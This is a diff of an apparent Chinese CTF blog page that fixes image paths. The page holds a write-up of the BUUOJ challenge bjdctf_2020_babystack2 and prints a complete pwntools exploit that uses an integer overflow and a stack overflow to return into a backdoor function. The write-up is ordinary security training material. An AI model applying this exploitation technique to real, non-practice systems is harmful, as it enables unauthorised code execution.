@@ -27,13 +27,13 @@
 <meta property="og:site_name" content="Shuwen&#39;s blog">
 <meta property="og:description" content="bjdctf_2020_babystack2 简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可   完整exp12345678910111213141516from pwn import *p&#x3D;process(&quot;.&#x2F;bjdctf_2020_babystack2&quot;)p&#x3D;remote(&quot;node3.buuoj.cn&quot;,28526)context.log_level &#x3D; &#39;deb">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2021/05/08/00-04-Shuwen/Users/YCNN/AppData/Roaming/Typora/typora-user-images/image-20210506201527291.png">
+<meta property="og:image" content="http://yoursite.com/2021/05/08/00-04/Users/YCNN/AppData/Roaming/Typora/typora-user-images/image-20210506201527291.png">
 <meta property="article:published_time" content="2021-05-07T16:04:17.000Z">
 <meta property="article:modified_time" content="2021-05-07T16:05:16.791Z">
 <meta property="article:author" content="Shuwen">
 <meta property="article:tag" content="buu刷题">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2021/05/08/00-04-Shuwen/Users/YCNN/AppData/Roaming/Typora/typora-user-images/image-20210506201527291.png">
+<meta name="twitter:image" content="http://yoursite.com/2021/05/08/00-04/Users/YCNN/AppData/Roaming/Typora/typora-user-images/image-20210506201527291.png">
 
 <link rel="canonical" href="http://yoursite.com/2021/05/08/00-04/">
 
@@ -209,7 +209,7 @@
         <h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><blockquote>
 <p>简单的，首先通过整数溢出绕过检查，然后栈溢出，存在后门函数，直接执行即可</p>
 </blockquote>
-<p><img src="/2021/05/08/00-04-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506201527291.png" alt="image-20210506201527291"></p>
+<p><img src="/2021/05/08/00-04/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506201527291.png" alt="image-20210506201527291"></p>
 <h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
